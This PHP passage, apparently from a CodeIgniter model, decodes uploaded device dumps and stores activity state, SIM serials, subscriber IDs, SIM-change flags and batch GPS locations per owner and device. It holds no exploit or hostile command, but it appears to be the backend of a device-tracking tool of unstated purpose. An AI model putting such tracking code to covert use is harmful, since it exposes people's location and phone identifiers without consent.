            'transport_mode'        => $loc['transport_mode'] ?? null,
            'transport_confidence'  => $loc['transport_confidence'] ?? 0,
            'route_polyline'        => $loc['route_polyline'] ?? null,
            'waypoints'             => json_encode($loc['waypoints'] ?? []),
            'speed_kmh'             => $loc['speed_kmh'] ?? null,
            'vertical_accuracy'     => $loc['vertical_accuracy'] ?? null,
            'floor_level'           => $loc['floor_level'] ?? null,
            'building_id'           => $loc['building_id'] ?? null,
            'indoor_level'          => $loc['indoor_level'] ?? null,
            'satellite_count'       => $loc['satellite_count'] ?? 0,
            'hdop'                  => $loc['hdop'] ?? 0,
            'vdop'                  => $loc['vdop'] ?? 0,
            'pdop'                  => $loc['pdop'] ?? 0,
            'gnss_status'           => $loc['gnss_status'] ?? null,
            'nmea_sentence'         => $loc['nmea_sentence'] ?? null,
            'extracted_at'  => $extractedAt ?? $loc['fetched_at'] ?? null,
            'created_at'    => $dated,
            'updated_at'    => $dated
        ];

        try {
            return (bool) $this->db->table('tbl_location')->insert($locationData);
        } catch (\Exception $e) {
            log_message('error', 'insertLocationRow failed: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Inserts a single activity row.
     */
    private function insertActivityRow(array $act, int $ownerId, string $devicePrint, ?string $extractedAt, string $dated): bool
    {
        $activityData = [
            'owner_id'       => $ownerId,
            'device_id'      => $devicePrint,
            'status'         => $act['status'] ?? 'feature_not_fully_implemented',
            'activity_type'  => $act['activity_type'] ?? null,
            'confidence'     => $act['confidence'] ?? 0,
            'info'           => $act['info'] ?? null,
            'is_interactive' => isset($act['is_interactive']) ? ($act['is_interactive'] ? 1 : 0) : 0,
            'battery_level'  => $act['battery_level'] ?? null,
            'charging_status'=> $act['charging_status'] ?? null,
            'network_type'   => $act['network_type'] ?? null,
            'screen_on'      => isset($act['screen_on']) ? ($act['screen_on'] ? 1 : 0) : 0,
            'extracted_at'   => $extractedAt ?? $act['fetched_at'] ?? null,
            'activity_time'  => $act['activity_time'] ?? null,
            'created_at'     => $dated,
            'updated_at'     => $dated
        ];

        try {
            return (bool) $this->db->table('tbl_activity')->insert($activityData);
        } catch (\Exception $e) {
            log_message('error', 'insertActivityRow failed: ' . $e->getMessage());
            return false;
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Sim Configs
    // ═════════════════════════════════════════════════════════════════════

    public function parse_sim_configs(string $file_name, int $ownerId, string $devicePrint, int $fileRecordId = null)
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', 'parse_sim_configs: failed to read file: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', 'parse_sim_configs: failed to decode: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', 'parse_sim_configs: invalid JSON: ' . $file_name);
                return false;
            }

            $extractedAt = $json['extracted_at'] ?? null;
            $recordsInserted = 0;

            $entries = $json['sim_configs'] ?? $json['sim_config'] ?? [$json];
            if (isset($entries['sim_serial']) || isset($entries['subscriber_id'])) {
                $entries = [$entries];
            }

            foreach ($entries as $entry) {
                $data = [
                    'owner_id'        => $ownerId,
                    'device_id'       => $devicePrint,
                    'sim_serial'      => $entry['sim_serial'] ?? null,
                    'subscriber_id'   => $entry['subscriber_id'] ?? null,
                    'sim_operator_name' => $entry['sim_operator_name'] ?? $entry['operator_name'] ?? null,
                    'sim_country_iso'   => $entry['sim_country_iso'] ?? $entry['country_iso'] ?? null,
                    'sim_state'       => $entry['sim_state'] ?? $entry['state'] ?? null,
                    'phone_type'      => $entry['phone_type'] ?? $entry['phoneType'] ?? null,
                    'is_sim_changed'  => !empty($entry['is_sim_changed']) ? 1 : 0,
                    'captured_at'     => $entry['captured_at'] ?? $entry['timestamp'] ?? $extractedAt,
                    'extracted_at'    => $extractedAt,
                    'created_at'      => $dated,
                    'updated_at'      => $dated,
                ];

                if ($this->db->table('tbl_sim_configs')->insert($data)) {
                    $recordsInserted++;
                }
            }

            return $recordsInserted;

        } catch (\Exception $e) {
            log_message('error', 'parse_sim_configs exception: ' . $e->getMessage());
            return false;
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Live Locations (batch GPS points)
    // ═════════════════════════════════════════════════════════════════════

    public function parse_live_locations(string $file_name, int $ownerId, string $devicePrint, int $fileRecordId = null)
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', 'parse_live_locations: failed to read file: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', 'parse_live_locations: failed to decode: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', 'parse_live_locations: invalid JSON: ' . $file_name);
                return false;
            }

            $extractedAt = $json['extracted_at'] ?? null;
            $recordsInserted = 0;

            $points = $json['points'] ?? $json['locations'] ?? [];
            if (empty($points) && isset($json['latitude'])) {
                $points = [$json];
            }

            foreach ($points as $pt) {
                $locationData = [
                    'owner_id'      => $ownerId,
                    'device_id'     => $devicePrint,
                    'latitude'      => $pt['latitude'] ?? $pt['lat'] ?? null,
                    'longitude'     => $pt['longitude'] ?? $pt['lon'] ?? $pt['lng'] ?? null,
                    'accuracy'      => $pt['accuracy'] ?? null,
                    'altitude'      => $pt['altitude'] ?? $pt['alt'] ?? null,
                    'bearing'       => $pt['bearing'] ?? null,
                    'speed'         => $pt['speed'] ?? null,
                    'provider'      => $pt['provider'] ?? null,
                    'location_time' => $pt['time'] ?? $pt['timestamp'] ?? $pt['captured_at'] ?? null,
                    'status'        => $pt['status'] ?? (isset($pt['latitude']) ? 'success' : 'no_location_found'),
                    'extracted_at'  => $extractedAt,
                    'created_at'    => $dated,
                    'updated_at'    => $dated,
                ];

                if ($this->db->table('tbl_location')->insert($locationData)) {
                    $recordsInserted++;
                }
            }

            // Trigger geo processing after location insert
            if ($recordsInserted > 0) {
                $this->triggerGeoProcessing($ownerId, $devicePrint);
            }

            return $recordsInserted;

        } catch (\Exception $e) {
            log_message('error', 'parse_live_locations exception: ' . $e->getMessage());
            return false;
        }
    }
}